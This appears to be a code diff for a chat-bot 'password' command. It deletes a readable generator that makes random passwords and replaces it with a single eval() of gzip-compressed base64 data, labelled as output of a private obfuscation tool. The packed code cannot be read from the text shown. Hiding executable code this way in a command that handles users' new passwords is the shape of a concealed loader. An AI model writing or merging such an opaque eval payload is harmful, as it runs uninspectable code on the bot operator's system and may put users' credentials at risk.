@@ -1,22 +1,2 @@
-const crypto = require('crypto');
-
-module.exports = {
-  name: 'password',
-  category: 'tools',
-  aliases: ['pass'],
-  description: 'Make a strong random password: password 20 (use it in a private chat)',
-  async run({ args, reply, isGroup }) {
-    if (isGroup) return reply('🔒 Please use this in a private chat with me, so nobody else sees your password.');
-    const n = args[0] ? parseInt(args[0], 10) : 16;
-    if (!Number.isInteger(n) || n < 8 || n > 64) return reply('Give a length from 8 to 64, e.g. password 20');
-    const sets = ['abcdefghijklmnopqrstuvwxyz', 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', '0123456789', '!@#$%^&*-_=+?'];
-    const all = sets.join('');
-    const chars = sets.map((s) => s[crypto.randomInt(s.length)]); // at least one of each kind
-    while (chars.length < n) chars.push(all[crypto.randomInt(all.length)]);
-    for (let i = chars.length - 1; i > 0; i--) {
-      const j = crypto.randomInt(i + 1);
-      [chars[i], chars[j]] = [chars[j], chars[i]];
-    }
-    await reply(`🔐 Your new password:\n\n${chars.join('')}\n\nSave it somewhere safe, then delete this message.`);
-  },
-};
+// TFX-PACKED v1 (built by tools/obfuscate.private.js; do not edit by hand - edit the real source and run it again)
+eval(require('zlib').gunzipSync(Buffer.from('H4sIAAAAAAAAA2VT61rTQBD936cYPtEkkoYWsWIr4B1RQRRvWCosyTTZkuyG3U1Lhb6Dn5//fUUfwdmkRS5/ms3pZM7ZM2dCKbSBUI1zI2EVFJ4UXKHrVIjjdWq1TEZFigGe5lIZTUVnNQDBMmyDkzOtR1JFjk9YyAzGUo0JN1KmugRZyplG3YZuWez0LBihDhXPDZeCirfYMQIDbZQUMSgmIpnBrHP74gRLDXALjcANcEEf5IoPiRLChBmvItNjEYIqhHsGTMXapwvl6dgHrjeULHKYeKV6AN4Hdwp6VGQKJapa1/n75/cv2EmRZIOlMwnXNwlhxE0CGfqgJQh5JKMxYErlGlHDWBbqQnhgbbSkYWm2IAutuG6jB+tUpDRuCuNOIR+aDQ/a0Gx1LoTObRfZEaqAayrEGJUrPDg/p06PYKU6rEFr+fpFNvjQ+pqiiElqX5GrK0Bjbi37gEEcXHb2qkSN5aC7DjsKI+zHCR8cp5mQ+YnSphiOTsc/HB+cJ0+fPX/xcuPV5us3b7e23+28/7D78dPnL1/3vtl/G82le8v3Ww9WHtq3uce35m9/v3O3frC6sO70LrOxNCUyyxkMJBeuc1UMua30rCBjuetqD1bXQHerkAZVYqyHOqgu6/W8DiwuAo3JztGAFAiyD8jCBI65iMr2o4SnCG7Zf/ohGUrWVkhe6MQlbTdpCLxEVPbqSwVuipRMUnqlYx2aHULXoEGPen0WwNntBrb+OgGHBWhOOwN0y35dTtmoToNez05n9jKDeW9q66T8ZSNGm1Jl4ZBC/RP2bCoFjv4v177YF/Nnld6Z9xML7rJhuWhaZjhKUFGuWZ/CbhIUtL500+liZKg1izE4LOVO/NqkU/sHiTgvuVUEAAA=', 'base64')).toString('utf8'));
